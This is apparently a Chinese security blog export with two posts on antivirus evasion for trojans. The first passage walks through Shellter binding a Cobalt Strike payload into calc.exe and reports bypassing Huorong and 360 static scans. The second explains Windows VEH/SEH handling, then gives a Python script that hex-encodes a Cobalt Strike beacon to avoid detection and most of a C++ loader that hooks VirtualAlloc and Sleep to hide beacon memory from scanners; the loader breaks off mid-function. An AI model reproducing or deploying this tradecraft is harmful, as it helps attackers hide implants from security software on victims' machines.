<p><img src="/%E6%9C%A8%E9%A9%AC%E5%85%8D%E6%9D%80%E4%B9%8B%E5%B7%A5%E5%85%B7%E7%AF%87/image-20230126212152241.png" alt="image-20230126212152241">		</p>
<h3 id="2-绑定32位PE文件"><a href="#2-绑定32位PE文件" class="headerlink" title="2.绑定32位PE文件"></a>2.绑定32位PE文件</h3><p>填写PE文件路径并要求此PE文件是32位的, 此处我以32位的calc.exe(计算器)为例, 先将calc.exe拖到Shellter文件目录, 然后填写PE文件路径, 随后会在Shellter_Backups目录备份原PE文件</p>
<img src="木马免杀之工具篇/image-20230126213343207.png" alt="image-20230126213343207" style="zoom:67%;" />	

<img src="木马免杀之工具篇/image-20230126213510379.png" alt="image-20230126213510379" style="zoom:67%;" />			



<h3 id="3-是否开启隐身模式"><a href="#3-是否开启隐身模式" class="headerlink" title="3.是否开启隐身模式"></a>3.是否开启隐身模式</h3><p>询问是否启用隐身模式, 此处我选择了Yes</p>
<blockquote>
<p>启用隐身模式后, 执行生成的免杀木马不仅可以上线, 还能正常使用原PE文件的功能, 但缺点是免杀效果差</p>
</blockquote>
<p><img src="/%E6%9C%A8%E9%A9%AC%E5%85%8D%E6%9D%80%E4%B9%8B%E5%B7%A5%E5%85%B7%E7%AF%87/image-20230126213740706.png" alt="image-20230126213740706">	</p>
<h3 id="4-填写监听"><a href="#4-填写监听" class="headerlink" title="4.填写监听"></a>4.填写监听</h3><p>询问你是使用工具自带的payload还是自定义监听, 此处我输入L选择自带payload, 然后输入2选着HTTP监听</p>
<p><img src="/%E6%9C%A8%E9%A9%AC%E5%85%8D%E6%9D%80%E4%B9%8B%E5%B7%A5%E5%85%B7%E7%AF%87/image-20230126214117290.png" alt="image-20230126214117290">	</p>
<p>此处我使用CS来创建监听, 监听的地址和端口是<code>192.168.47.155:80</code>, 然后在Shellter命令行中填写</p>
<p><img src="/%E6%9C%A8%E9%A9%AC%E5%85%8D%E6%9D%80%E4%B9%8B%E5%B7%A5%E5%85%B7%E7%AF%87/image-20230126214320371.png" alt="image-20230126214320371"></p>
<p><img src="/%E6%9C%A8%E9%A9%AC%E5%85%8D%E6%9D%80%E4%B9%8B%E5%B7%A5%E5%85%B7%E7%AF%87/image-20230126214440736.png" alt="image-20230126214440736">		</p>
<h3 id="5-测试效果"><a href="#5-测试效果" class="headerlink" title="5.测试效果"></a>5.测试效果</h3><p>生成的免杀木马会覆盖原先PE文件, 执行效果如下图所示</p>
<p><img src="/%E6%9C%A8%E9%A9%AC%E5%85%8D%E6%9D%80%E4%B9%8B%E5%B7%A5%E5%85%B7%E7%AF%87/%E5%8A%A8%E7%94%BB.gif" alt="动画">	</p>
<h2 id="杀软测试-1"><a href="#杀软测试-1" class="headerlink" title="杀软测试"></a>杀软测试</h2><p>将免杀木马发送到杀毒平台检测, 可以发现还是能绕过绝大多数杀软的, 像火绒,360杀毒这些主流杀软都能绕过, 但是这只仅仅是静态扫描, 动态扫描还是很难绕过</p>
<p><img src="/%E6%9C%A8%E9%A9%AC%E5%85%8D%E6%9D%80%E4%B9%8B%E5%B7%A5%E5%85%B7%E7%AF%87/image-20230126215153437.png" alt="image-20230126215153437">	</p>
]]></content>
  </entry>
  <entry>
    <title></title>
    <url>/2024/04/29/%E5%88%A9%E7%94%A8%E5%BC%82%E5%B8%B8%E5%AE%9E%E7%8E%B0%E5%85%8D%E6%9D%80/</url>
    <content><![CDATA[<p>CPU检测到异常 -&gt; 查中断表执行处理函数 -&gt; CommonDispatchException -&gt; KiDispatchException -&gt;  KiUserExceptionDispatcher -&gt; RtlDispatchException -&gt; VEH -&gt; SEH</p>
<p> CPU异常执行的流程</p>
<p> 1、CPU指令检测到异常</p>
<p> 2、查IDT表，执行中断处理函数</p>
<p> 3、调用CommonDispatchException(构建EXCEPTION_RECORD)</p>
<p> 4、KiDispatchException(分发异常：目的是找到异常的处理函数)</p>
<h1 id="Windows异常处理流程"><a href="#Windows异常处理流程" class="headerlink" title="Windows异常处理流程"></a>Windows异常处理流程</h1><p>在Windows中，异常处理的机制包括向量异常处理（VEH）、结构化异常处理（SEH）和C++异常处理（C++EH）。当发生异常时，它们的执行顺序如下：</p>
<ol>
<li><strong>终止当前程序的执行</strong>：首先，异常导致当前指令的执行被终止。CPU然后开始查找可以处理异常的代码。</li>
<li><strong>调试器</strong>：如果进程正在被调试，操作系统会首先将异常通知给调试器。调试器可以选择处理异常，或者让操作系统继续其正常的异常处理流程。</li>
<li><strong>向量异常处理（VEH）</strong>：如果存在VEH处理器，它们将首先得到机会处理异常。VEH处理器按照它们注册的顺序被调用，如果任何一个VEH处理器处理了异常（即返回<code>EXCEPTION_CONTINUE_EXECUTION</code>），则后续的VEH处理器和SEH处理器将不会被调用。</li>
<li><strong>结构化异常处理（SEH）</strong>：如果所有的VEH处理器都无法处理异常，或者没有注册VEH处理器，操作系统会开始调用SEH处理器。SEH处理器按照它们在堆栈中的顺序（即反注册的顺序）被调用，如果任何一个SEH处理器处理了异常（即返回<code>EXCEPTION_CONTINUE_EXECUTION</code>），则后续的SEH处理器将不会被调用。</li>
<li><strong>C++异常处理（C++EH）</strong>：如果所有的SEH处理器都无法处理异常，或者没有注册SEH处理器，且异常是一个C++异常（即由C++的<code>throw</code>语句抛出的异常），则会调用C++的异常处理器。</li>
<li><strong>如果所有的异常处理器都无法处理异常</strong>：如果所有的异常处理器都无法处理异常，或者没有注册任何异常处理器，操作系统通常会终止当前进程，并显示一个错误消息。</li>
</ol>
<p>在这个过程中，VEH处理器是优先于SEH处理器被调用的，这是因为VEH处理器更加灵活，可以用来处理一些在SEH中难以处理的异常情况。例如，当发生堆栈溢出时，由于SEH处理器需要使用堆栈来执行，因此无法处理这种异常，但VEH处理器则可以处理</p>
<h1 id="VEH"><a href="#VEH" class="headerlink" title="VEH"></a>VEH</h1><h2 id="介绍"><a href="#介绍" class="headerlink" title="介绍"></a>介绍</h2><p>向量异常处理（Vectored Exception Handling，VEH）是 Windows 提供的一种异常处理机制，可以用 <code>AddVectoredExceptionHandler</code> 函数来添加一个向量异常处理器（vectored exception handler）。这个函数需要两个参数：第一个参数指定处理器的优先级，如果为 <code>TRUE</code>，处理器将被添加到链表的开始，如果为 <code>FALSE</code>，处理器将被添加到链表的末尾；第二个参数是指向处理器函数的指针</p>
<h2 id="代码实例"><a href="#代码实例" class="headerlink" title="代码实例"></a>代码实例</h2><p>以下代码中的<code>idiv ecx</code>指令是用于将寄存器的EDX:EAX的值除以ECX寄存器的值，并将结果放入EAX中，将余数放入EDX中</p>
<blockquote>
<p>在x86架构的CPU中，EDX和EAX是32位寄存器。在进行一些特定的操作（比如长除法和长乘法）时，这两个寄存器会一起使用，形成一个64位的值。其中，EDX是高32位，EAX是低32位</p>
</blockquote>
<p>在下述代码中， “xor ecx, ecx” 指令将 ECX 寄存器的值设置为 0。当你尝试执行 “idiv ecx” 指令时，就相当于试图用 0 作为除数进行除法运算。在数学中，用 0 作为除数是没有定义的，因此 CPU 会触发一个异常，即你所看到的 0xC0000094</p>
<p>这个异常被你的 VEH 函数捕获，然后修复了异常状态（通过将 ECX 寄存器的值修改为 1），并告诉操作系统继续执行程序。这就是为什么你的程序在除法操作之后能够继续运行，打印出 “veh_code run here again” 的原因</p>
<figure class="highlight cpp"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;windows.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="comment">// 声明一个函数指针类型，该函数是用来添加VEH（向量异常处理程序）的</span></span><br><span class="line"><span class="function"><span class="keyword">typedef</span> <span class="title">PVOID</span><span class="params">(NTAPI* FnAddVectoredExceptionHandler)</span><span class="params">(ULONG, _EXCEPTION_POINTERS*)</span></span>;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 创建一个指向FnAddVectoredExceptionHandler类型的函数指针变量</span></span><br><span class="line">FnAddVectoredExceptionHandler MyAddVectoredExceptionHeader;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 向量异常处理程序。该函数可以返回两种值：EXCEPTION_CONTINUE_EXECUTION 表示已处理异常，EXCEPTION_CONTINUE_SEARCH 表示未处理异常</span></span><br><span class="line"><span class="function">LONG NTAPI <span class="title">VectExceptionHandler</span><span class="params">(PEXCEPTION_POINTERS pExcepInfo)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="comment">// 当异常发生时，弹出一个消息框提示异常已发生</span></span><br><span class="line">    ::<span class="built_in">MessageBoxA</span>(<span class="literal">NULL</span>, <span class="string">&quot;VEH Function run&quot;</span>, <span class="string">&quot;VEH error&quot;</span>, MB_OK);</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 检查是否发生了除0异常（异常代码0xC0000094），如果是，则处理异常并继续执行程序</span></span><br><span class="line">    <span class="keyword">if</span> (pExcepInfo-&gt;ExceptionRecord-&gt;ExceptionCode == <span class="number">0xC0000094</span>)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="comment">// 修改寄存器ECX的值为1，避免再次发生除0异常</span></span><br><span class="line">        pExcepInfo-&gt;ContextRecord-&gt;Ecx = <span class="number">1</span>;</span><br><span class="line"></span><br><span class="line">        <span class="comment">// 返回EXCEPTION_CONTINUE_EXECUTION表示异常已被处理，程序可以继续执行</span></span><br><span class="line">        <span class="keyword">return</span> EXCEPTION_CONTINUE_EXECUTION;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 如果发生的异常不是我们想要处理的，返回EXCEPTION_CONTINUE_SEARCH表示异常未处理，系统需要寻找其他的异常处理程序来处理这个异常</span></span><br><span class="line">    <span class="keyword">return</span> EXCEPTION_CONTINUE_SEARCH;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 添加向量异常处理程序并测试它</span></span><br><span class="line"><span class="function">VOID <span class="title">VEH</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="comment">// 使用MyAddVectoredExceptionHandler函数，将VectExceptionHandler函数添加到VEH链表的头部</span></span><br><span class="line">    <span class="built_in">AddVectoredExceptionHandler</span>(<span class="number">1</span>, VectExceptionHandler);</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 模拟发生一个除0异常，用于测试我们的VEH函数是否可以正常工作</span></span><br><span class="line">    __asm</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="keyword">xor</span> edx, edx</span><br><span class="line">        <span class="keyword">xor</span> ecx, ecx</span><br><span class="line">        mov eax, <span class="number">0x10</span></span><br><span class="line">        idiv ecx <span class="comment">// EDX:EAX 除以 ECX，由于ECX为0，所以这里会发生除0异常</span></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 如果VEH函数正确地处理了异常，那么程序将会继续执行到这里</span></span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;veh_code run here again&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">main</span><span class="params">(<span class="type">int</span> argc, <span class="type">char</span>* argv[])</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="comment">// 调用VEH函数，添加向量异常处理程序并测试它</span></span><br><span class="line">    <span class="built_in">VEH</span>();</span><br><span class="line">    <span class="built_in">getchar</span>();</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>



<h1 id="SEH"><a href="#SEH" class="headerlink" title="SEH"></a>SEH</h1><h2 id="介绍-1"><a href="#介绍-1" class="headerlink" title="介绍"></a>介绍</h2><p>SEH（Structured Exception Handling，结构化异常处理）是Windows操作系统中的一种错误处理和异常处理机制。SEH提供了一种强大、灵活且通用的方法来处理异常，它使得开发者能够为应用程序中发生的运行时错误和异常编写自定义的处理代码</p>
<p>在C++中，可以使用<code>_try</code>、<code>_except</code>和<code>_finally</code>关键字来实现SEH异常处理。<code>_try</code>块包含可能引发异常的代码；<code>_except</code>块包含处理异常的代码；而<code>_finally</code>块包含在任何情况下都应执行的代码，无论是否发生异常</p>
<h2 id="代码实例-1"><a href="#代码实例-1" class="headerlink" title="代码实例"></a>代码实例</h2><p>在下述例子中，<code>CauseException</code> 函数尝试对空指针进行解引用，这会引发一个访问违规（access violation）异常。这个异常在 <code>main</code> 函数的 <code>__try</code> 块中被捕获，并在 <code>__except</code> 块中被处理</p>
<figure class="highlight cpp"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;windows.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">void</span> <span class="title">CauseException</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="type">int</span> *p = <span class="literal">nullptr</span>;</span><br><span class="line">    *p = <span class="number">0</span>;  <span class="comment">// This will cause an access violation exception</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    __try &#123;</span><br><span class="line">        <span class="built_in">CauseException</span>();</span><br><span class="line">    &#125;</span><br><span class="line">    __except(EXCEPTION_EXECUTE_HANDLER) &#123;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;Caught an exception\n&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>



<h1 id="使用VEH绕过内存查杀"><a href="#使用VEH绕过内存查杀" class="headerlink" title="使用VEH绕过内存查杀"></a>使用VEH绕过内存查杀</h1><h2 id="简介"><a href="#简介" class="headerlink" title="简介"></a>简介</h2><p>在今天的高级网络威胁环境中，恶意软件需要采取复杂的策略来避免被安全软件检测。其中一种策略就是动态地更改执行内存的属性。</p>
<p>通常，杀毒软件会扫描进程中带有可执行属性的内存区域，这是因为它们可能包含恶意代码。</p>
<p>然而，如果我们在适当的时机去除内存区域的可执行属性，就可以避免这种扫描，从而避开杀毒软件的侦查。但是，问题在于，如果我们去除内存的可执行属性，恶意代码就无法运行了。</p>
<p>不过，我们可以利用Windows的异常处理机制，在需要运行恶意代码的时候临时恢复其可执行属性。然后，当代码进入休眠状态时，我们再次去除其可执行属性，使其隐藏起来。这样，恶意代码就可以在需要的时候运行，而在不需要的时候则隐藏起来，避开杀毒软件的侦查。</p>
<h2 id="实现思路"><a href="#实现思路" class="headerlink" title="实现思路"></a>实现思路</h2><p>1.使用 <code>AddVectoredExceptionHandler</code> 注册一个异常处理函数 <code>FirstVectExcepHandler</code>，这个函数会在发生异常时被调用。当程序访问了一个非法的内存地址（如访问一个没有权限的内存区域）时，系统会引发一个异常，这时异常处理函数就会被调用</p>
<p>2.使用 <code>Hook()</code> 函数钩住 <code>VirtualAlloc</code> 和 <code>Sleep</code> 两个系统函数。这样，每次调用这两个函数时，实际上都会执行我们定义的 <code>NewVirtualAlloc</code> 和 <code>NewSleep</code> 函数，其中<code>NewVirtualAlloc</code> 函数用于记录分配的内存区域的地址和大小，以便后续操作</p>
<p>3.<code>NewSleep</code> 函数中，首次调用时，会释放之前分配的内存，然后唤醒 <code>Beacon_set_Memory_attributes</code> 线程，这个线程会修改内存区域的权限为 PAGE_READWRITE，也就是只有读写权限，没有执行权限</p>
<p>4.<code>FirstVectExcepHandler</code> 是注册的异常处理函数，当访问的内存区域没有执行权限时，会产生一个异常，这时这个函数会被调用。这个函数首先判断异常是否是访问违规（代码 0xc0000005），并且是否是在我们之前记录的内存区域内，如果是，就将内存区域的权限修改为 PAGE_EXECUTE_READWRITE，也就是添加了执行权限，并让程序继续执行</p>
<h2 id="代码实现"><a href="#代码实现" class="headerlink" title="代码实现"></a>代码实现</h2><p>首先使用python写一个将二进制文件转换成16进制字符串并保存到txt文件的脚本，这是因为CobaltStrike生成的bin文件会报毒，需对其进行处理</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment"># 导入必要的库</span></span><br><span class="line"><span class="keyword">import</span> binascii</span><br><span class="line"></span><br><span class="line"><span class="comment"># 指定要转换的二进制文件路径</span></span><br><span class="line">bin_file_path = <span class="string">&quot;cobalt_strike.bin&quot;</span></span><br><span class="line"><span class="comment"># 指定转换结果保存的txt文件路径</span></span><br><span class="line">txt_file_path = <span class="string">&quot;cobalt_strike_hex.txt&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 读取二进制文件</span></span><br><span class="line"><span class="keyword">with</span> <span class="built_in">open</span>(bin_file_path, <span class="string">&#x27;rb&#x27;</span>) <span class="keyword">as</span> f:</span><br><span class="line">    bin_content = f.read()</span><br><span class="line"></span><br><span class="line"><span class="comment"># 将二进制内容转换为16进制字符串</span></span><br><span class="line">hex_content = binascii.hexlify(bin_content).decode()</span><br><span class="line"></span><br><span class="line"><span class="comment"># 将16进制字符串保存到txt文件</span></span><br><span class="line"><span class="keyword">with</span> <span class="built_in">open</span>(txt_file_path, <span class="string">&#x27;w&#x27;</span>) <span class="keyword">as</span> f:</span><br><span class="line">    f.write(hex_content)</span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;转换完成，16进制内容已保存到&#123;&#125;中&quot;</span>.<span class="built_in">format</span>(txt_file_path))</span><br></pre></td></tr></table></figure>



<p>如下代码是利用VEH异常处理绕过内存查杀的主要实现</p>
<figure class="highlight cpp"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;iostream&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&lt;Windows.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;detours/detours.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;detours/detver.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;fstream&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;sstream&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;iostream&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> std;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 全局变量声明</span></span><br><span class="line">LPVOID Beacon_address; <span class="comment">// Beacon内存地址</span></span><br><span class="line">SIZE_T Beacon_data_len; <span class="comment">// Beacon内存长度</span></span><br><span class="line">DWORD Beacon_Memory_address_flOldProtect; <span class="comment">// Beacon内存属性</span></span><br><span class="line">HANDLE hEvent; <span class="comment">// 事件句柄</span></span><br><span class="line"></span><br><span class="line">BOOL Vir_FLAG = TRUE; <span class="comment">// 感染标记</span></span><br><span class="line">LPVOID shellcode_addr; <span class="comment">// shellcode内存地址</span></span><br><span class="line"></span><br><span class="line"><span class="comment">//定义两个指向原函数的指针，分别是Sleep和VirtualAlloc</span></span><br><span class="line"><span class="function"><span class="type">static</span> <span class="title">VOID</span><span class="params">(WINAPI* OldSleep)</span><span class="params">(DWORD dwMilliseconds)</span> </span>= Sleep;</span><br><span class="line"><span class="function"><span class="type">static</span> <span class="title">LPVOID</span> <span class="params">(WINAPI *OldVirtualAlloc)</span><span class="params">(LPVOID lpAddress, SIZE_T dwSize, DWORD flAllocationType, DWORD flProtect)</span> </span>= VirtualAlloc;</span><br><span class="line"></span><br><span class="line"><span class="comment">//定义Sleep和VirtualAlloc的钩子函数</span></span><br><span class="line"><span class="function">LPVOID WINAPI <span class="title">NewVirtualAlloc</span><span class="params">(LPVOID lpAddress, SIZE_T dwSize, DWORD flAllocationType, DWORD flProtect)</span> </span>&#123;</span><br><span class="line">	Beacon_data_len = dwSize;</span><br><span class="line">	Beacon_address = <span class="built_in">OldVirtualAlloc</span>(lpAddress, dwSize, flAllocationType, flProtect);</span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">&quot;Memory Allocation Size:%d\n&quot;</span>, Beacon_data_len);</span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">&quot;Memory Allocation Address:%llx \n&quot;</span>, Beacon_address);</span><br><span class="line">	<span class="keyword">return</span> Beacon_address;</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="type">void</span> WINAPI <span class="title">NewSleep</span><span class="params">(DWORD dwMilliseconds)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">	<span class="keyword">if</span> (Vir_FLAG)</span><br><span class="line">	&#123;	</span><br><span class="line">		<span class="built_in">printf</span>(<span class="string">&quot;Free Memory Address:%llx\n&quot;</span>, shellcode_addr);</span><br><span class="line">		<span class="built_in">VirtualFree</span>(shellcode_addr, <span class="number">0</span>, MEM_RELEASE);</span><br><span class="line">		Vir_FLAG = <span class="literal">false</span>;</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">&quot;The time of Sleep:%d\n&quot;</span>, dwMilliseconds);</span><br><span class="line">	<span class="built_in">SetEvent</span>(hEvent);</span><br><span class="line">	<span class="built_in">OldSleep</span>(dwMilliseconds);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">//对函数进行inlineHook</span></span><br><span class="line"><span class="function"><span class="type">void</span> <span class="title">Hook</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">	<span class="built_in">DetourRestoreAfterWith</span>(); <span class="comment">//避免重复HOOK</span></span><br><span class="line">	<span class="built_in">DetourTransactionBegin</span>(); <span class="comment">// 开始HOOK</span></span><br><span class="line">	<span class="built_in">DetourUpdateThread</span>(<span class="built_in">GetCurrentThread</span>());</span><br><span class="line">	<span class="built_in">DetourAttach</span>((PVOID*)&amp;OldVirtualAlloc, NewVirtualAlloc);</span><br><span class="line">	<span class="built_in">DetourAttach</span>((PVOID*)&amp;OldSleep, NewSleep);</span><br><span class="line">	<span class="built_in">DetourTransactionCommit</span>(); <span class="comment">//  提交HOOK</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">//解除对函数的inlineHook</span></span><br><span class="line"><span class="function"><span class="type">void</span> <span class="title">UnHook</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">	<span class="built_in">DetourTransactionBegin</span>();</span><br><span class="line">	<span class="built_in">DetourUpdateThread</span>(<span class="built_in">GetCurrentThread</span>());</span><br><span class="line">	<span class="built_in">DetourDetach</span>((PVOID*)&amp;OldVirtualAlloc, NewVirtualAlloc);</span><br><span class="line">	<span class="built_in">DetourTransactionCommit</span>();</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">//判断异常代码的地址是否在Beacon内存的范围之内</span></span><br><span class="line"><span class="function">BOOL <span class="title">is_Exception</span><span class="params">(DWORD64 Exception_addr)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">	<span class="keyword">if</span> (Exception_addr &lt; ((DWORD64)Beacon_address + Beacon_data_len) &amp;&amp; Exception_addr &gt;(DWORD64)Beacon_address)</span><br><span class="line">	&#123;</span><br><span class="line">		<span class="built_in">printf</span>(<span class="string">&quot;The Exception Address is a match:%llx\n&quot;</span>, Exception_addr);</span><br><span class="line">		<span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">&quot;The Exception Address not a match:%llx\n&quot;</span>, Exception_addr);</span><br><span class="line">	<span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 定义VEH的异常处理函数</span></span><br><span class="line"><span class="function">LONG NTAPI <span class="title">FirstVectExcepHandler</span><span class="params">(PEXCEPTION_POINTERS pExcepInfo)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">&quot;FirstVectExcepHandler\n&quot;</span>);</span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">&quot;The Exception Code is :%x\n&quot;</span>, pExcepInfo-&gt;ExceptionRecord-&gt;ExceptionCode);</span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">&quot;The Thread Address is :%llx\n&quot;</span>, pExcepInfo-&gt;ContextRecord-&gt;Rip);		   </span><br><span class="line">	<span class="keyword">if</span> (pExcepInfo-&gt;ExceptionRecord-&gt;ExceptionCode == <span class="number">0xc0000005</span> &amp;&amp; <span class="built_in">is_Exception</span>(pExcepInfo-&gt;ContextRecord-&gt;Rip))</span><br><span class="line">	&#123;</span><br><span class="line">		<span class="built_in">printf</span>(<span class="string">&quot;Modify the memory attribute to executable\n&quot;</span>);</span><br><span class="line">		<span class="built_in">VirtualProtect</span>(Beacon_address, Beacon_data_len, PAGE_EXECUTE_READWRITE, &amp;Beacon_Memory_address_flOldProtect);</span><br><span class="line">		<span class="keyword">return</span> EXCEPTION_CONTINUE_EXECUTION;</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="keyword">return</span> EXCEPTION_CONTINUE_SEARCH;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 线程函数，用于将Beacon的内存属性设置为可读写，即去掉可执行权限</span></span><br><span class="line"><span class="function">DWORD WINAPI <span class="title">Beacon_set_Memory_attributes</span><span class="params">(LPVOID lpParameter)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">	<span class="keyword">while</span> (<span class="literal">true</span>)</span><br><span class="line">	&#123;</span><br><span class="line">		<span class="built_in">WaitForSingleObject</span>(hEvent, INFINITE);</span><br><span class="line">		<span class="built_in">printf</span>(<span class="string">&quot;Set Beacon memory attribute unexecutable\n&quot;</span>);</span><br><span class="line">		<span class="built_in">VirtualProtect</span>(Beacon_address, Beacon_data_len, PAGE_READWRITE, &amp;Beacon_Memory_address_flOldProtect);</span><br><span class="line">		<span class="built_in">ResetEvent</span>(hEvent);</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 将十六进制中的单个字符转换为相应的整数值</span></span><br><span class="line"><span class="function"><span class="type">unsigned</span> <span class="type">char</span> <span class="title">hexCharToByte</span><span class="params">(<span class="type">char</span> character)</span> </span>&#123;</span><br><span class="line">	<span class="keyword">if</span> (character &gt;= <span class="string">&#x27;0&#x27;</span> &amp;&amp; character &lt;= <span class="string">&#x27;9&#x27;</span>) &#123;</span><br><span class="line">		<span class="keyword">return</span> character - <span class="string">&#x27;0&#x27;</span>;</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="keyword">if</span> (character &gt;= <span class="string">&#x27;a&#x27;</span> &amp;&amp; character &lt;= <span class="string">&#x27;f&#x27;</span>) &#123;</span><br><span class="line">		<span class="keyword">return</span> character - <span class="string">&#x27;a&#x27;</span> + <span class="number">10</span>;</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="keyword">if</span> (character &gt;= <span class="string">&#x27;A&#x27;</span> &amp;&amp; character &lt;= <span class="string">&#x27;F&#x27;</span>) &#123;</span><br><span class="line">		<span class="keyword">return</span> character - <span class="string">&#x27;A&#x27;</span> + <span class="number">10</span>;</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 将十六进制字符串转换成字节型数组</span></span><br><span class="line"><span class="function"><span class="type">void</span> <span class="title">hexStringToBytes</span><span class="params">(<span class="type">const</span> std::string&amp; hexString, <span class="type">unsigned</span> <span class="type">char</span>* byteArray, <span class="type">int</span> byteArraySize)</span> </span>&#123;</span><br><span class="line">	<span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>; i &lt; hexString.<span class="built_in">length</span>(); i += <span class="number">2</span>) &#123;</span><br><span class="line">		byteArray[i / <span class="number">2</span>] = <span class="built_in">hexCharToByte</span>(hexString[i]) * <span class="number">16</span> + <span class="built_in">hexCharToByte</span>(hexString[i + <span class="number">1</span>]);</span><br><span class="line">	&#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;	</span><br><span class="line">	</span><br><span class="line">	hEvent = <span class="built_in">CreateEvent</span>(<span class="literal">NULL</span>, TRUE, <span class="literal">false</span>, <span class="literal">NULL</span>); <span class="comment">// 创建事件(一开始无信号)</span></span><br><span class="line"></span><br><span class="line">	<span class="built_in">AddVectoredExceptionHandler</span>(<span class="number">1</span>, &amp;FirstVectExcepHandler); <span class="comment">// 添加异常处理函数</span></span><br><span class="line">	</span><br><span class="line">	<span class="built_in">Hook</span>(); <span class="comment">//开始Hook</span></span><br><span class="line"></span><br><span class="line">	<span class="comment">//创建线程</span></span><br><span class="line">	HANDLE hThread1 = <span class="built_in">CreateThread</span>(<span class="literal">NULL</span>, <span class="number">0</span>, Beacon_set_Memory_attributes, <span class="literal">NULL</span>, <span class="number">0</span>, <span class="literal">NULL</span>);</span><br><span class="line">	<span class="built_in">CloseHandle</span>(hThread1);</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">	<span class="function">std::ifstream <span class="title">file</span><span class="params">(<span class="string">&quot;beacon_hex.txt&quot;</span>)</span></span>;  <span class="comment">//打开指定文件</span></span><br><span class="line">	<span class="type">size_t</span> size;  